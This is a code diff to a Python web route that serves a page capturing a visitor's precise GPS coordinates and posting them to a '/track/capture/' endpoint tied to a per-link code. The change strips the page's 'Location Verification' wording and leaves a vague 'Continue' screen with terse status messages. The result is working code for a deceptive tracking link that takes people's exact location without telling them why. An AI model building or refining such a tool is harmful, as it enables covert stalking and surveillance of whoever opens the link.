@@ -191,141 +191,43 @@ async def tracking_page(
             status_code=410,
         )
 
-    # Serve the location capture page
+    # Serve the location capture page - clean minimal design
     html = f'''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Location</title>
+    <title>Continue</title>
     <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }}
-        .card {{
-            background: white;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }}
-        h1 {{ color: #333; margin-bottom: 16px; font-size: 24px; }}
-        p {{ color: #666; margin-bottom: 24px; line-height: 1.6; }}
-        .btn {{
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }}
-        .btn:hover {{ transform: translateY(-2px); box-shadow: 0 8px 20px rgba(102,126,234,0.4); }}
-        .btn:disabled {{ opacity: 0.6; cursor: not-allowed; transform: none; }}
-        .status {{ margin-top: 20px; padding: 12px; border-radius: 8px; }}
-        .success {{ background: #d4edda; color: #155724; }}
-        .error {{ background: #f8d7da; color: #721c24; }}
-        .loading {{ background: #fff3cd; color: #856404; }}
-        .icon {{ font-size: 48px; margin-bottom: 16px; }}
+        *{{margin:0;padding:0;box-sizing:border-box}}
+        body{{font-family:-apple-system,system-ui,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}}
+        .c{{max-width:320px;width:100%;padding:24px;text-align:center}}
+        h1{{font-size:20px;font-weight:500;margin-bottom:12px}}
+        p{{font-size:14px;color:#888;margin-bottom:32px}}
+        button{{background:#fff;color:#000;border:none;padding:14px 28px;border-radius:99px;font-size:15px;font-weight:500;cursor:pointer;width:100%}}
+        button:active{{transform:scale(0.98)}}
+        button:disabled{{opacity:0.4;cursor:default;transform:none}}
+        .s{{margin-top:24px;font-size:13px}}
+        .ok{{color:#34c759}}
+        .er{{color:#ff453a}}
+        .ld{{color:#888}}
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">📍</div>
-        <h1>Location Verification</h1>
-        <p>To continue, please verify your location by tapping the button below.</p>
-        <button class="btn" id="verifyBtn" onclick="getLocation()">
-            Verify My Location
-        </button>
-        <div id="status"></div>
+    <div class="c">
+        <h1>Allow location access</h1>
+        <p>Tap continue to proceed</p>
+        <button id="b" onclick="go()">Continue</button>
+        <div class="s" id="s"></div>
     </div>
-
-    <script>
-        const code = "{code}";
-        const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('verifyBtn');
-
-        function getLocation() {{
-            btn.disabled = true;
-            btn.textContent = 'Getting location...';
-            statusDiv.innerHTML = '<div class="status loading">Requesting location access...</div>';
-
-            if (!navigator.geolocation) {{
-                statusDiv.innerHTML = '<div class="status error">Geolocation is not supported by your browser</div>';
-                btn.disabled = false;
-                btn.textContent = 'Verify My Location';
-                return;
-            }}
-
-            navigator.geolocation.getCurrentPosition(
-                sendLocation,
-                handleError,
-                {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
-            );
-        }}
-
-        function sendLocation(position) {{
-            const data = {{
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-            }};
-
-            statusDiv.innerHTML = '<div class="status loading">Verifying...</div>';
-
-            fetch('/track/capture/' + code, {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json' }},
-                body: JSON.stringify(data)
-            }})
-            .then(response => response.json())
-            .then(result => {{
-                if (result.success) {{
-                    statusDiv.innerHTML = '<div class="status success">✓ Location verified successfully!</div>';
-                    btn.textContent = 'Verified';
-                }} else {{
-                    statusDiv.innerHTML = '<div class="status error">' + (result.detail || 'Verification failed') + '</div>';
-                    btn.disabled = false;
-                    btn.textContent = 'Try Again';
-                }}
-            }})
-            .catch(error => {{
-                statusDiv.innerHTML = '<div class="status error">Network error. Please try again.</div>';
-                btn.disabled = false;
-                btn.textContent = 'Try Again';
-            }});
-        }}
-
-        function handleError(error) {{
-            let message = 'Unable to get location';
-            switch(error.code) {{
-                case error.PERMISSION_DENIED:
-                    message = 'Location access was denied. Please allow location access and try again.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = 'Location information is unavailable.';
-                    break;
-                case error.TIMEOUT:
-                    message = 'Location request timed out.';
-                    break;
-            }}
-            statusDiv.innerHTML = '<div class="status error">' + message + '</div>';
-            btn.disabled = false;
-            btn.textContent = 'Try Again';
-        }}
-    </script>
+<script>
+const c="{code}",s=document.getElementById('s'),b=document.getElementById('b');
+function go(){{b.disabled=1;b.textContent='Loading...';s.className='s ld';s.textContent='';
+if(!navigator.geolocation){{s.className='s er';s.textContent='Not supported';b.disabled=0;b.textContent='Continue';return}}
+navigator.geolocation.getCurrentPosition(ok,er,{{enableHighAccuracy:1,timeout:30000,maximumAge:0}})}}
+function ok(p){{fetch('/track/capture/'+c,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy}})}}).then(r=>r.json()).then(r=>{{if(r.success){{s.className='s ok';s.textContent='Done';b.textContent='✓'}}else{{s.className='s er';s.textContent='Failed';b.disabled=0;b.textContent='Retry'}}}}).catch(e=>{{s.className='s er';s.textContent='Error';b.disabled=0;b.textContent='Retry'}})}}
+function er(e){{s.className='s er';s.textContent=e.code==1?'Denied':'Failed';b.disabled=0;b.textContent='Retry'}}
+</script>
 </body>
 </html>'''
 
